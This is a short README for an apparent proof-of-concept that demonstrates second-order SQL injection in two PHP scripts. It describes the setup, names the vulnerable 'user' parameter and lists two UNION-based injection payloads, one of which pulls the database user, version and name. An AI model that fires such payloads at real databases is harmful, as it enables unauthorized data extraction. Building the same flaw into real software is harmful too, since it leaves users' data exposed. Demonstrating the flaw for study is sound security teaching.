# Second-Order-SQLi
This is a POC for Second Order SQL Injection
0. Before using change the database details in both files ( getdata.php and instert.php)
1. When you run instertdata.php, it will create a two tables profile and pii. 
2. When you run getdata.php with id, it will fetch the details from both tables. 
 Though id is there in only profile table, internally the script run another sql query filter "user" as both have "user" column common. 
 Here "user" parameter is vulnerable
 
 Attack: 
  vunerable parameter (insert.php) - user
  1. Payload: X' UNION SELECT user(),version(),database(), 4 -- 
  2. Palyoad:  X' UNION SELECT 1,2,3,4 -- 
  
